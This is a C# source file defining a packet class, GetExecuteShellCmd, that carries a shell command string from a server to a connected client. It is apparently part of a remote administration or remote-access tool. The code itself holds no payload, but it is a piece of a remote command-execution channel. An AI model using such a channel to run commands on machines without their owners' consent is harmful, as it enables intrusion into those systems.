using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    class GetExecuteShellCmd : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetExecuteShellCmd;
            }
        }

        [Index(0)]
        public virtual string command { get; set; }

        public GetExecuteShellCmd()
        {
        }

        public GetExecuteShellCmd(string command)
        {
            this.command = command;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
